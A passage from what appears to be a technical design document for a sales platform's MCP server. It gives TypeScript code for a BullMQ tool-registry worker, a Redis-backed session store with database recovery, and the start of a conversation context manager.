import { toolRegistry } from './tools/tool-registry';
import { MCPTool, ToolResult } from './tools/types';

// Job types
type ToolRegistryJobType = 'register' | 'unregister' | 'execute' | 'list' | 'get-schema';

interface ToolRegistryJobData {
  type: ToolRegistryJobType;
  tenantId: string;
  payload: any;
  requestId?: string;
}

interface ToolRegistryJobResult {
  type: ToolRegistryJobType;
  success: boolean;
  data?: any;
  error?: string;
}

// Queue configuration
const QUEUE_NAME = 'mcp:tool:register';
const QUEUE_CONFIG = {
  defaultJobOptions: {
    attempts: 3,
    backoff: {
      type: 'exponential' as const,
      delay: 1000
    },
    removeOnComplete: { count: 1000, age: 3600 },
    removeOnFail: { count: 500, age: 86400 }
  }
};

// Worker configuration
const WORKER_CONFIG = {
  concurrency: 10,
  limiter: {
    max: 50,
    duration: 1000
  },
  lockDuration: 30000
};

export class ToolRegistryWorker {
  private worker: Worker<ToolRegistryJobData, ToolRegistryJobResult>;
  private queue: Queue<ToolRegistryJobData, ToolRegistryJobResult>;
  
  constructor() {
    this.queue = new Queue(QUEUE_NAME, {
      connection: redisConnection,
      ...QUEUE_CONFIG
    });
    
    this.worker = new Worker(
      QUEUE_NAME,
      this.processJob.bind(this),
      {
        connection: redisConnection,
        ...WORKER_CONFIG
      }
    );
    
    this.setupEventHandlers();
  }
  
  /**
   * Process tool registry job
   */
  private async processJob(
    job: Job<ToolRegistryJobData, ToolRegistryJobResult>
  ): Promise<ToolRegistryJobResult> {
    const { type, tenantId, payload, requestId } = job.data;
    
    logger.info('Processing tool registry job', {
      jobId: job.id,
      type,
      tenantId,
      requestId
    });
    
    const timer = metrics.histogram('mcp_tool_registry_duration_seconds').startTimer();
    
    try {
      let result: ToolRegistryJobResult;
      
      switch (type) {
        case 'register':
          result = await this.handleRegister(tenantId, payload);
          break;
          
        case 'unregister':
          result = await this.handleUnregister(tenantId, payload);
          break;
          
        case 'execute':
          result = await this.handleExecute(tenantId, payload);
          break;
          
        case 'list':
          result = await this.handleList(tenantId, payload);
          break;
          
        case 'get-schema':
          result = await this.handleGetSchema(tenantId, payload);
          break;
          
        default:
          result = {
            type,
            success: false,
            error: `Unknown job type: ${type}`
          };
      }
      
      timer({ type, status: result.success ? 'success' : 'error' });
      return result;
      
    } catch (error) {
      timer({ type, status: 'error' });
      
      logger.error('Tool registry job failed', {
        jobId: job.id,
        type,
        error: error instanceof Error ? error.message : 'Unknown error'
      });
      
      return {
        type,
        success: false,
        error: error instanceof Error ? error.message : 'Unknown error'
      };
    }
  }
  
  /**
   * Handle tool registration
   */
  private async handleRegister(
    tenantId: string,
    payload: { tool: MCPTool; registeredBy: string }
  ): Promise<ToolRegistryJobResult> {
    const { tool, registeredBy } = payload;
    
    const success = toolRegistry.registerTool(tool, registeredBy, tenantId);
    
    return {
      type: 'register',
      success,
      data: success ? { name: tool.name, tenantId } : undefined,
      error: success ? undefined : 'Registration failed'
    };
  }
  
  /**
   * Handle tool unregistration
   */
  private async handleUnregister(
    tenantId: string,
    payload: { name: string }
  ): Promise<ToolRegistryJobResult> {
    const { name } = payload;
    
    const success = toolRegistry.unregisterTool(name, tenantId);
    
    return {
      type: 'unregister',
      success,
      data: success ? { name } : undefined,
      error: success ? undefined : 'Tool not found'
    };
  }
  
  /**
   * Handle tool execution
   */
  private async handleExecute(
    tenantId: string,
    payload: {
      name: string;
      input: any;
      context: any;
      options?: any;
    }
  ): Promise<ToolRegistryJobResult> {
    const { name, input, context, options } = payload;
    
    const executionContext = {
      tenantId,
      ...context,
      db: require('@cerniq/database').pool,
      redis: require('@cerniq/redis').redisClient,
      logger
    };
    
    const result = await toolRegistry.executeTool(name, input, executionContext, options);
    
    return {
      type: 'execute',
      success: result.success,
      data: result.data,
      error: result.error?.message
    };
  }
  
  /**
   * Handle tool listing
   */
  private async handleList(
    tenantId: string,
    payload: { category?: string; enabled?: boolean }
  ): Promise<ToolRegistryJobResult> {
    const tools = toolRegistry.listTools({
      tenantId,
      category: payload.category as any,
      enabled: payload.enabled,
      includeGlobal: true
    });
    
    const toolSummaries = tools.map(t => ({
      name: t.name,
      displayName: t.displayName,
      displayNameRo: t.displayNameRo,
      description: t.description,
      category: t.category,
      tags: t.tags,
      enabled: t.metadata.enabled
    }));
    
    return {
      type: 'list',
      success: true,
      data: { tools: toolSummaries, count: toolSummaries.length }
    };
  }
  
  /**
   * Handle schema retrieval
   */
  private async handleGetSchema(
    tenantId: string,
    payload: { name?: string }
  ): Promise<ToolRegistryJobResult> {
    if (payload.name) {
      const schema = toolRegistry.getToolSchema(payload.name, tenantId);
      if (!schema) {
        return {
          type: 'get-schema',
          success: false,
          error: `Tool not found: ${payload.name}`
        };
      }
      return {
        type: 'get-schema',
        success: true,
        data: { schema }
      };
    }
    
    // Get all schemas
    const schemas = toolRegistry.getAllToolSchemas(tenantId);
    return {
      type: 'get-schema',
      success: true,
      data: { schemas, count: schemas.length }
    };
  }
  
  /**
   * Setup event handlers
   */
  private setupEventHandlers(): void {
    this.worker.on('completed', (job, result) => {
      logger.debug('Tool registry job completed', {
        jobId: job.id,
        type: job.data.type,
        success: result.success
      });
    });
    
    this.worker.on('failed', (job, error) => {
      logger.error('Tool registry job failed', {
        jobId: job?.id,
        type: job?.data.type,
        error: error.message
      });
    });
    
    this.worker.on('error', (error) => {
      logger.error('Worker error', { error: error.message });
    });
  }
  
  /**
   * Add job to queue
   */
  async addJob(
    data: ToolRegistryJobData,
    options?: { priority?: number; delay?: number }
  ): Promise<Job<ToolRegistryJobData, ToolRegistryJobResult>> {
    return this.queue.add(data.type, data, {
      priority: options?.priority || 2,
      delay: options?.delay
    });
  }
  
  /**
   * Graceful shutdown
   */
  async shutdown(): Promise<void> {
    logger.info('Shutting down Tool Registry Worker...');
    await this.worker.close();
    await this.queue.close();
    logger.info('Tool Registry Worker shut down');
  }
}

// Worker instance
export const toolRegistryWorker = new ToolRegistryWorker();
```

---

## 4. Worker L3: Session Manager

### 4.1 Overview

Worker L3 Session Manager handles MCP session lifecycle management, conversation context tracking, and state persistence for AI agent interactions. It maintains session state across multiple interactions, enabling contextual continuity for complex sales conversations.

**Key Responsibilities:**

- MCP session creation and termination
- Conversation context management
- State persistence and recovery
- Session timeout handling
- Multi-session coordination
- Context window optimization

**Queue Configuration:**

```typescript
// packages/workers/src/etapa3/l-mcp-server/l3-session-manager/queue.ts

import { Queue, Worker, Job } from 'bullmq';
import { Redis } from 'ioredis';
import { logger } from '@cerniq/logger';

// Queue configuration
const QUEUE_NAME = 'mcp:session:manage';

const queueConfig = {
  defaultJobOptions: {
    attempts: 3,
    backoff: {
      type: 'exponential' as const,
      delay: 1000
    },
    removeOnComplete: {
      age: 3600,     // Keep completed jobs for 1 hour
      count: 1000    // Keep last 1000 completed jobs
    },
    removeOnFail: {
      age: 86400     // Keep failed jobs for 24 hours
    }
  }
};

const workerConfig = {
  concurrency: 100,      // High concurrency for session operations
  limiter: {
    max: 1000,           // Max 1000 jobs per second
    duration: 1000
  }
};
```

### 4.2 Session State Model

```typescript
// packages/workers/src/etapa3/l-mcp-server/l3-session-manager/types.ts

/**
 * MCP Session state
 */
export interface MCPSession {
  // Identification
  sessionId: string;
  tenantId: string;
  userId?: string;
  customerId?: string;
  conversationId?: string;
  
  // Session metadata
  createdAt: Date;
  lastActivityAt: Date;
  expiresAt: Date;
  status: SessionStatus;
  
  // Channel information
  channel: SessionChannel;
  channelMetadata?: ChannelMetadata;
  
  // Context
  context: SessionContext;
  
  // Capabilities
  capabilities: SessionCapabilities;
  
  // Statistics
  stats: SessionStats;
}

export type SessionStatus = 
  | 'initializing'
  | 'active'
  | 'idle'
  | 'suspended'
  | 'expired'
  | 'terminated'
  | 'error';

export type SessionChannel = 
  | 'web_chat'
  | 'whatsapp'
  | 'email'
  | 'api'
  | 'internal';

export interface ChannelMetadata {
  // Web chat specific
  browserInfo?: string;
  ipAddress?: string;
  userAgent?: string;
  
  // WhatsApp specific
  wabaId?: string;
  phoneNumberId?: string;
  
  // Email specific
  emailAddress?: string;
  threadId?: string;
  
  // API specific
  apiKeyId?: string;
  clientVersion?: string;
}

/**
 * Session context - maintains conversation state
 */
export interface SessionContext {
  // Conversation history (summarized for token efficiency)
  conversationSummary?: string;
  recentMessages: ContextMessage[];
  messageCount: number;
  
  // Current state
  currentIntent?: string;
  currentTopic?: string;
  currentProduct?: string;
  currentNegotiation?: NegotiationContext;
  
  // Customer context
  customer?: CustomerContext;
  
  // Product context
  products: ProductContext[];
  cart?: CartContext;
  
  // Quote context
  activeQuote?: QuoteContext;
  
  // Pending actions
  pendingActions: PendingAction[];
  
  // Variables and slots
  variables: Record<string, unknown>;
  slots: Record<string, SlotValue>;
  
  // Memory (long-term context)
  memory: MemoryItem[];
}

export interface ContextMessage {
  role: 'user' | 'assistant' | 'system';
  content: string;
  timestamp: Date;
  tokenCount: number;
  metadata?: {
    intent?: string;
    sentiment?: number;
    entities?: Record<string, string>;
  };
}

export interface NegotiationContext {
  negotiationId: string;
  state: string;
  currentOffer?: {
    productId: string;
    quantity: number;
    unitPrice: number;
    discount: number;
  };
  counterOffers: number;
  lastActivity: Date;
}

export interface CustomerContext {
  id: string;
  cui?: string;
  companyName: string;
  contactName?: string;
  tier: 'bronze' | 'silver' | 'gold';
  segment?: string;
  creditLimit?: number;
  paymentTerms?: number;
  preferences?: Record<string, unknown>;
  history?: {
    totalOrders: number;
    totalRevenue: number;
    lastOrderDate?: Date;
    averageOrderValue: number;
  };
}

export interface ProductContext {
  id: string;
  sku: string;
  name: string;
  price: number;
  inStock: boolean;
  discussed: boolean;
  addedToCart: boolean;
  quotedPrice?: number;
}

export interface CartContext {
  items: CartItem[];
  subtotal: number;
  discount: number;
  total: number;
  currency: string;
  createdAt: Date;
  updatedAt: Date;
}

export interface CartItem {
  productId: string;
  sku: string;
  name: string;
  quantity: number;
  unitPrice: number;
  discount: number;
  lineTotal: number;
}

export interface QuoteContext {
  quoteId: string;
  status: 'draft' | 'sent' | 'viewed' | 'accepted' | 'rejected' | 'expired';
  items: QuoteItem[];
  total: number;
  validUntil: Date;
  sentAt?: Date;
}

export interface QuoteItem {
  productId: string;
  quantity: number;
  unitPrice: number;
  discount: number;
  lineTotal: number;
}

export interface PendingAction {
  id: string;
  type: 'confirm_order' | 'send_quote' | 'reserve_stock' | 'schedule_callback' | 'escalate';
  data: Record<string, unknown>;
  createdAt: Date;
  expiresAt?: Date;
}

export interface SlotValue {
  name: string;
  value: unknown;
  type: 'string' | 'number' | 'boolean' | 'date' | 'entity';
  confidence: number;
  source: 'user' | 'inferred' | 'system';
  timestamp: Date;
}

export interface MemoryItem {
  key: string;
  value: unknown;
  type: 'preference' | 'fact' | 'relationship' | 'event';
  importance: number;
  createdAt: Date;
  lastAccessedAt: Date;
  accessCount: number;
}

/**
 * Session capabilities
 */
export interface SessionCapabilities {
  // Available tools
  tools: string[];
  
  // Available resources
  resources: string[];
  
  // Permissions
  permissions: string[];
  
  // Limits
  limits: SessionLimits;
  
  // Features
  features: {
    canNegotiate: boolean;
    canCreateQuotes: boolean;
    canProcessOrders: boolean;
    canAccessFiscal: boolean;
    canEscalate: boolean;
    autoSummarize: boolean;
  };
}

export interface SessionLimits {
  maxTokensPerMessage: number;
  maxContextTokens: number;
  maxSessionDuration: number;   // minutes
  maxIdleTime: number;          // minutes
  maxMessagesPerSession: number;
  maxToolCallsPerMessage: number;
}

/**
 * Session statistics
 */
export interface SessionStats {
  messagesSent: number;
  messagesReceived: number;
  toolCalls: number;
  resourceLoads: number;
  tokensUsed: number;
  avgResponseTime: number;
  handovers: number;
  escalations: number;
  errors: number;
}
```

### 4.3 Session Store

```typescript
// packages/workers/src/etapa3/l-mcp-server/l3-session-manager/session-store.ts

import { Redis } from 'ioredis';
import { logger } from '@cerniq/logger';
import { MCPSession, SessionStatus, SessionContext } from './types';

const SESSION_PREFIX = 'mcp:session:';
const SESSION_INDEX_PREFIX = 'mcp:session:index:';
const DEFAULT_SESSION_TTL = 3600;          // 1 hour
const MAX_SESSION_TTL = 86400;             // 24 hours
const CONTEXT_SNAPSHOT_INTERVAL = 300;     // 5 minutes

/**
 * Redis-based session store with persistence
 */
export class SessionStore {
  private redis: Redis;
  private db: any; // Drizzle instance
  
  constructor(redis: Redis, db: any) {
    this.redis = redis;
    this.db = db;
  }
  
  /**
   * Create new session
   */
  async createSession(params: {
    tenantId: string;
    userId?: string;
    customerId?: string;
    conversationId?: string;
    channel: string;
    channelMetadata?: Record<string, unknown>;
    capabilities?: Partial<SessionCapabilities>;
    ttl?: number;
  }): Promise<MCPSession> {
    const sessionId = this.generateSessionId();
    const now = new Date();
    const ttl = Math.min(params.ttl || DEFAULT_SESSION_TTL, MAX_SESSION_TTL);
    
    const session: MCPSession = {
      sessionId,
      tenantId: params.tenantId,
      userId: params.userId,
      customerId: params.customerId,
      conversationId: params.conversationId,
      createdAt: now,
      lastActivityAt: now,
      expiresAt: new Date(now.getTime() + ttl * 1000),
      status: 'initializing',
      channel: params.channel as any,
      channelMetadata: params.channelMetadata,
      context: this.createInitialContext(),
      capabilities: this.createDefaultCapabilities(params.capabilities),
      stats: this.createInitialStats()
    };
    
    // Store in Redis
    const key = `${SESSION_PREFIX}${sessionId}`;
    await this.redis.setex(key, ttl, JSON.stringify(session));
    
    // Add to indices
    await this.addToIndices(session);
    
    // Store initial state in database for recovery
    await this.persistSessionToDb(session);
    
    logger.info('Session created', { 
      sessionId, 
      tenantId: params.tenantId,
      channel: params.channel 
    });
    
    return session;
  }
  
  /**
   * Get session by ID
   */
  async getSession(sessionId: string): Promise<MCPSession | null> {
    const key = `${SESSION_PREFIX}${sessionId}`;
    const data = await this.redis.get(key);
    
    if (!data) {
      // Try to recover from database
      return this.recoverSessionFromDb(sessionId);
    }
    
    const session = JSON.parse(data) as MCPSession;
    
    // Check if expired
    if (new Date(session.expiresAt) < new Date()) {
      await this.expireSession(sessionId);
      return null;
    }
    
    return session;
  }
  
  /**
   * Update session
   */
  async updateSession(
    sessionId: string, 
    updates: Partial<MCPSession>
  ): Promise<MCPSession | null> {
    const session = await this.getSession(sessionId);
    if (!session) return null;
    
    const updatedSession: MCPSession = {
      ...session,
      ...updates,
      lastActivityAt: new Date()
    };
    
    // Calculate remaining TTL
    const remainingTtl = Math.max(
      0,
      Math.floor((new Date(session.expiresAt).getTime() - Date.now()) / 1000)
    );
    
    // Extend session if activity detected
    const newTtl = Math.max(remainingTtl, DEFAULT_SESSION_TTL);
    updatedSession.expiresAt = new Date(Date.now() + newTtl * 1000);
    
    const key = `${SESSION_PREFIX}${sessionId}`;
    await this.redis.setex(key, newTtl, JSON.stringify(updatedSession));
    
    // Update indices if needed
    if (updates.status || updates.customerId) {
      await this.updateIndices(session, updatedSession);
    }
    
    return updatedSession;
  }
  
  /**
   * Update session context
   */
  async updateContext(
    sessionId: string,
    contextUpdates: Partial<SessionContext>
  ): Promise<SessionContext | null> {
    const session = await this.getSession(sessionId);
    if (!session) return null;
    
    const updatedContext: SessionContext = {
      ...session.context,
      ...contextUpdates
    };
    
    // Apply context optimizations
    await this.optimizeContext(updatedContext);
    
    await this.updateSession(sessionId, { 
      context: updatedContext,
      lastActivityAt: new Date()
    });
    
    return updatedContext;
  }
  
  /**
   * Add message to context
   */
  async addMessage(
    sessionId: string,
    message: {
      role: 'user' | 'assistant' | 'system';
      content: string;
      metadata?: Record<string, unknown>;
    }
  ): Promise<void> {
    const session = await this.getSession(sessionId);
    if (!session) throw new Error(`Session not found: ${sessionId}`);
    
    const tokenCount = this.estimateTokens(message.content);
    
    const contextMessage = {
      ...message,
      timestamp: new Date(),
      tokenCount
    };
    
    // Add to recent messages
    session.context.recentMessages.push(contextMessage);
    session.context.messageCount++;
    
    // Trim if exceeding token limit
    await this.trimContextMessages(session.context, session.capabilities.limits.maxContextTokens);
    
    // Update stats
    if (message.role === 'user') {
      session.stats.messagesReceived++;
    } else if (message.role === 'assistant') {
      session.stats.messagesSent++;
    }
    session.stats.tokensUsed += tokenCount;
    
    await this.updateSession(sessionId, {
      context: session.context,
      stats: session.stats
    });
  }
  
  /**
   * Get active session for customer
   */
  async getActiveSessionForCustomer(
    tenantId: string,
    customerId: string,
    channel?: string
  ): Promise<MCPSession | null> {
    const indexKey = `${SESSION_INDEX_PREFIX}customer:${tenantId}:${customerId}`;
    const sessionIds = await this.redis.smembers(indexKey);
    
    for (const sessionId of sessionIds) {
      const session = await this.getSession(sessionId);
      if (session && 
          session.status === 'active' &&
          (!channel || session.channel === channel)) {
        return session;
      }
    }
    
    return null;
  }
  
  /**
   * Get all sessions for tenant
   */
  async getTenantSessions(
    tenantId: string,
    options?: {
      status?: SessionStatus;
      channel?: string;
      limit?: number;
    }
  ): Promise<MCPSession[]> {
    const indexKey = `${SESSION_INDEX_PREFIX}tenant:${tenantId}`;
    let sessionIds = await this.redis.smembers(indexKey);
    
    const sessions: MCPSession[] = [];
    for (const sessionId of sessionIds) {
      const session = await this.getSession(sessionId);
      if (!session) continue;
      
      // Apply filters
      if (options?.status && session.status !== options.status) continue;
      if (options?.channel && session.channel !== options.channel) continue;
      
      sessions.push(session);
      
      if (options?.limit && sessions.length >= options.limit) break;
    }
    
    return sessions;
  }
  
  /**
   * Activate session (mark as ready)
   */
  async activateSession(sessionId: string): Promise<MCPSession | null> {
    return this.updateSession(sessionId, { status: 'active' });
  }
  
  /**
   * Suspend session (temporary pause)
   */
  async suspendSession(sessionId: string): Promise<MCPSession | null> {
    const session = await this.getSession(sessionId);
    if (!session) return null;
    
    // Save context snapshot to database
    await this.saveContextSnapshot(session);
    
    return this.updateSession(sessionId, { status: 'suspended' });
  }
  
  /**
   * Resume suspended session
   */
  async resumeSession(sessionId: string): Promise<MCPSession | null> {
    const session = await this.getSession(sessionId);
    if (!session || session.status !== 'suspended') return null;
    
    // Extend expiration
    const newExpiresAt = new Date(Date.now() + DEFAULT_SESSION_TTL * 1000);
    
    return this.updateSession(sessionId, { 
      status: 'active',
      expiresAt: newExpiresAt
    });
  }
  
  /**
   * Terminate session
   */
  async terminateSession(
    sessionId: string,
    reason?: string
  ): Promise<void> {
    const session = await this.getSession(sessionId);
    if (!session) return;
    
    // Save final state to database
    await this.persistSessionToDb({
      ...session,
      status: 'terminated'
    });
    
    // Remove from Redis
    const key = `${SESSION_PREFIX}${sessionId}`;
    await this.redis.del(key);
    
    // Remove from indices
    await this.removeFromIndices(session);
    
    logger.info('Session terminated', { sessionId, reason });
  }
  
  /**
   * Expire session (timeout)
   */
  async expireSession(sessionId: string): Promise<void> {
    const session = await this.getSession(sessionId);
    if (!session) return;
    
    // Save final state
    await this.persistSessionToDb({
      ...session,
      status: 'expired'
    });
    
    // Remove from Redis
    const key = `${SESSION_PREFIX}${sessionId}`;
    await this.redis.del(key);
    
    // Remove from indices
    await this.removeFromIndices(session);
    
    logger.info('Session expired', { sessionId });
  }
  
  // Private helper methods
  
  private generateSessionId(): string {
    return `sess_${Date.now()}_${Math.random().toString(36).substring(2, 15)}`;
  }
  
  private createInitialContext(): SessionContext {
    return {
      recentMessages: [],
      messageCount: 0,
      products: [],
      pendingActions: [],
      variables: {},
      slots: {},
      memory: []
    };
  }
  
  private createDefaultCapabilities(
    overrides?: Partial<SessionCapabilities>
  ): SessionCapabilities {
    return {
      tools: [
        'search_products',
        'get_product_details',
        'check_stock',
        'get_product_price',
        'calculate_quote'
      ],
      resources: [
        'products',
        'clients',
        'conversations',
        'catalogs'
      ],
      permissions: [
        'read:products',
        'read:clients',
        'create:quotes',
        'create:orders'
      ],
      limits: {
        maxTokensPerMessage: 4096,
        maxContextTokens: 32000,
        maxSessionDuration: 480,     // 8 hours
        maxIdleTime: 60,             // 1 hour
        maxMessagesPerSession: 500,
        maxToolCallsPerMessage: 10
      },
      features: {
        canNegotiate: true,
        canCreateQuotes: true,
        canProcessOrders: true,
        canAccessFiscal: false,
        canEscalate: true,
        autoSummarize: true
      },
      ...overrides
    };
  }
  
  private createInitialStats(): SessionStats {
    return {
      messagesSent: 0,
      messagesReceived: 0,
      toolCalls: 0,
      resourceLoads: 0,
      tokensUsed: 0,
      avgResponseTime: 0,
      handovers: 0,
      escalations: 0,
      errors: 0
    };
  }
  
  private async addToIndices(session: MCPSession): Promise<void> {
    const pipeline = this.redis.pipeline();
    
    // Tenant index
    pipeline.sadd(
      `${SESSION_INDEX_PREFIX}tenant:${session.tenantId}`,
      session.sessionId
    );
    
    // Customer index (if applicable)
    if (session.customerId) {
      pipeline.sadd(
        `${SESSION_INDEX_PREFIX}customer:${session.tenantId}:${session.customerId}`,
        session.sessionId
      );
    }
    
    // Channel index
    pipeline.sadd(
      `${SESSION_INDEX_PREFIX}channel:${session.tenantId}:${session.channel}`,
      session.sessionId
    );
    
    // Status index
    pipeline.sadd(
      `${SESSION_INDEX_PREFIX}status:${session.tenantId}:${session.status}`,
      session.sessionId
    );
    
    await pipeline.exec();
  }
  
  private async updateIndices(
    oldSession: MCPSession,
    newSession: MCPSession
  ): Promise<void> {
    const pipeline = this.redis.pipeline();
    
    // Update status index
    if (oldSession.status !== newSession.status) {
      pipeline.srem(
        `${SESSION_INDEX_PREFIX}status:${oldSession.tenantId}:${oldSession.status}`,
        oldSession.sessionId
      );
      pipeline.sadd(
        `${SESSION_INDEX_PREFIX}status:${newSession.tenantId}:${newSession.status}`,
        newSession.sessionId
      );
    }
    
    // Update customer index
    if (oldSession.customerId !== newSession.customerId) {
      if (oldSession.customerId) {
        pipeline.srem(
          `${SESSION_INDEX_PREFIX}customer:${oldSession.tenantId}:${oldSession.customerId}`,
          oldSession.sessionId
        );
      }
      if (newSession.customerId) {
        pipeline.sadd(
          `${SESSION_INDEX_PREFIX}customer:${newSession.tenantId}:${newSession.customerId}`,
          newSession.sessionId
        );
      }
    }
    
    await pipeline.exec();
  }
  
  private async removeFromIndices(session: MCPSession): Promise<void> {
    const pipeline = this.redis.pipeline();
    
    pipeline.srem(
      `${SESSION_INDEX_PREFIX}tenant:${session.tenantId}`,
      session.sessionId
    );
    
    if (session.customerId) {
      pipeline.srem(
        `${SESSION_INDEX_PREFIX}customer:${session.tenantId}:${session.customerId}`,
        session.sessionId
      );
    }
    
    pipeline.srem(
      `${SESSION_INDEX_PREFIX}channel:${session.tenantId}:${session.channel}`,
      session.sessionId
    );
    
    pipeline.srem(
      `${SESSION_INDEX_PREFIX}status:${session.tenantId}:${session.status}`,
      session.sessionId
    );
    
    await pipeline.exec();
  }
  
  private estimateTokens(text: string): number {
    // Rough estimation: ~4 characters per token
    return Math.ceil(text.length / 4);
  }
  
  private async trimContextMessages(
    context: SessionContext,
    maxTokens: number
  ): Promise<void> {
    let totalTokens = context.recentMessages.reduce(
      (sum, msg) => sum + msg.tokenCount, 
      0
    );
    
    // Keep 80% of limit to leave room
    const targetTokens = Math.floor(maxTokens * 0.8);
    
    while (totalTokens > targetTokens && context.recentMessages.length > 1) {
      // Remove oldest message (keep at least system message if present)
      const removed = context.recentMessages.shift();
      if (removed) {
        totalTokens -= removed.tokenCount;
      }
    }
    
    // If still over limit, generate summary
    if (totalTokens > targetTokens) {
      await this.summarizeContext(context);
    }
  }
  
  private async summarizeContext(context: SessionContext): Promise<void> {
    // Create summary from messages
    const messages = context.recentMessages.map(m => 
      `${m.role}: ${m.content.substring(0, 200)}`
    ).join('\n');
    
    // Simple summary (in production, use LLM)
    context.conversationSummary = `Previous conversation summary: ${messages.substring(0, 1000)}...`;
    
    // Keep only recent messages
    context.recentMessages = context.recentMessages.slice(-10);
  }
  
  private async optimizeContext(context: SessionContext): Promise<void> {
    // Remove stale products
    context.products = context.products.filter(p => 
      p.discussed || p.addedToCart || 
      Date.now() - new Date(context.recentMessages[0]?.timestamp || Date.now()).getTime() < 1800000
    );
    
    // Clean expired pending actions
    const now = Date.now();
    context.pendingActions = context.pendingActions.filter(a => 
      !a.expiresAt || new Date(a.expiresAt).getTime() > now
    );
    
    // Limit memory items
    if (context.memory.length > 50) {
      // Sort by importance and access
      context.memory.sort((a, b) => 
        (b.importance * b.accessCount) - (a.importance * a.accessCount)
      );
      context.memory = context.memory.slice(0, 50);
    }
  }
  
  private async persistSessionToDb(session: MCPSession): Promise<void> {
    try {
      await this.db
        .insert(schema.mcpSessions)
        .values({
          sessionId: session.sessionId,
          tenantId: session.tenantId,
          userId: session.userId,
          customerId: session.customerId,
          conversationId: session.conversationId,
          channel: session.channel,
          status: session.status,
          context: session.context,
          capabilities: session.capabilities,
          stats: session.stats,
          createdAt: session.createdAt,
          expiresAt: session.expiresAt,
          lastActivityAt: session.lastActivityAt
        })
        .onConflictDoUpdate({
          target: schema.mcpSessions.sessionId,
          set: {
            status: session.status,
            context: session.context,
            stats: session.stats,
            lastActivityAt: session.lastActivityAt
          }
        });
    } catch (error) {
      logger.error('Failed to persist session', { 
        sessionId: session.sessionId, 
        error 
      });
    }
  }
  
  private async recoverSessionFromDb(sessionId: string): Promise<MCPSession | null> {
    try {
      const result = await this.db
        .select()
        .from(schema.mcpSessions)
        .where(eq(schema.mcpSessions.sessionId, sessionId))
        .limit(1);
      
      if (result.length === 0) return null;
      
      const row = result[0];
      
      // Check if still valid
      if (new Date(row.expiresAt) < new Date()) {
        return null;
      }
      
      // Restore to Redis
      const session: MCPSession = {
        sessionId: row.sessionId,
        tenantId: row.tenantId,
        userId: row.userId,
        customerId: row.customerId,
        conversationId: row.conversationId,
        createdAt: row.createdAt,
        lastActivityAt: row.lastActivityAt,
        expiresAt: row.expiresAt,
        status: row.status,
        channel: row.channel,
        context: row.context,
        capabilities: row.capabilities,
        stats: row.stats
      };
      
      const ttl = Math.floor((new Date(row.expiresAt).getTime() - Date.now()) / 1000);
      if (ttl > 0) {
        const key = `${SESSION_PREFIX}${sessionId}`;
        await this.redis.setex(key, ttl, JSON.stringify(session));
        await this.addToIndices(session);
      }
      
      return session;
    } catch (error) {
      logger.error('Failed to recover session', { sessionId, error });
      return null;
    }
  }
  
  private async saveContextSnapshot(session: MCPSession): Promise<void> {
    try {
      await this.db.insert(schema.mcpSessionSnapshots).values({
        sessionId: session.sessionId,
        tenantId: session.tenantId,
        context: session.context,
        stats: session.stats,
        snapshotAt: new Date()
      });
    } catch (error) {
      logger.error('Failed to save context snapshot', { 
        sessionId: session.sessionId, 
        error 
      });
    }
  }
}

// Export singleton
let sessionStore: SessionStore | null = null;

export function getSessionStore(redis: Redis, db: any): SessionStore {
  if (!sessionStore) {
    sessionStore = new SessionStore(redis, db);
  }
  return sessionStore;
}
```

### 4.4 Context Manager

```typescript
// packages/workers/src/etapa3/l-mcp-server/l3-session-manager/context-manager.ts

import { Redis } from 'ioredis';
import { logger } from '@cerniq/logger';
import { SessionContext, MemoryItem, SlotValue, ProductContext } from './types';
import { getSessionStore, SessionStore } from './session-store';

const MEMORY_IMPORTANCE_DECAY = 0.95;
const MAX_MEMORY_AGE_DAYS = 30;
const SLOT_CONFIDENCE_THRESHOLD = 0.7;

/**
 * Manages session context with smart memory and slot filling
 */
export class ContextManager {
  private sessionStore: SessionStore;
  private redis: Redis;
  
  constructor(sessionStore: SessionStore, redis: Redis) {
    this.sessionStore = sessionStore;
    this.redis = redis;
  }
  
  /**
   * Update conversation intent
   */
  async setIntent(
    sessionId: string,
    intent: string,
    confidence: number = 1.0
  ): Promise<void> {
    const session = await this.sessionStore.getSession(sessionId);
    if (!session) return;
    
    if (confidence >= SLOT_CONFIDENCE_THRESHOLD) {
      session.context.currentIntent = intent;
      await this.sessionStore.updateContext(sessionId, {
        currentIntent: intent
      });
      
      logger.debug('Intent set', { sessionId, intent, confidence });
    }
  }
  
  /**
   * Update current topic
   */
  async setTopic(sessionId: string, topic: string): Promise<void> {
    await this.sessionStore.updateContext(sessionId, {
      currentTopic: topic
    });
  }
  
  /**
   * Set slot value with confidence tracking
   */
  async setSlot(
    sessionId: string,
    name: string,
    value: unknown,
    options: {
      type?: 'string' | 'number' | 'boolean' | 'date' | 'entity';
      confidence?: number;
      source?: 'user' | 'inferred' | 'system';
    } = {}
  ): Promise<void> {
    const session = await this.sessionStore.getSession(sessionId);
    if (!session) return;
    
    const confidence = options.confidence ?? 1.0;
    
    // Only update if new confidence is higher or it's from user
    const existing = session.context.slots[name];
    if (existing && 
        options.source !== 'user' &&
        existing.confidence > confidence) {
      return;
    }
    
    const slotValue: SlotValue = {
      name,
      value,
      type: options.type ?? 'string',
      confidence,
      source: options.source ?? 'user',
      timestamp: new Date()
    };
    
    session.context.slots[name] = slotValue;
    
    await this.sessionStore.updateContext(sessionId, {
      slots: session.context.slots
    });
    
    logger.debug('Slot set', { sessionId, name, value, confidence });
  }
  
  /**
   * Get slot value
   */
  async getSlot(sessionId: string, name: string): Promise<SlotValue | null> {
    const session = await this.sessionStore.getSession(sessionId);
    return session?.context.slots[name] ?? null;
  }
  
  /**
   * Clear slot
   */
  async clearSlot(sessionId: string, name: string): Promise<void> {
    const session = await this.sessionStore.getSession(sessionId);
    if (!session) return;
    
    delete session.context.slots[name];
    
    await this.sessionStore.updateContext(sessionId, {
      slots: session.context.slots
    });
  }
  
  /**
   * Set variable (temporary session data)
   */
  async setVariable(
    sessionId: string,
    key: string,
    value: unknown
  ): Promise<void> {
    const session = await this.sessionStore.getSession(sessionId);
    if (!session) return;
    
    session.context.variables[key] = value;
    
    await this.sessionStore.updateContext(sessionId, {
      variables: session.context.variables
    });
  }
  
  /**
   * Get variable
   */
  async getVariable(sessionId: string, key: string): Promise<unknown> {
    const session = await this.sessionStore.getSession(sessionId);
    return session?.context.variables[key];
  }
  
  /**
   * Add to long-term memory
   */
  async remember(
    sessionId: string,
    key: string,
    value: unknown,
    options: {
      type?: 'preference' | 'fact' | 'relationship' | 'event';
      importance?: number;
    } = {}
  ): Promise<void> {
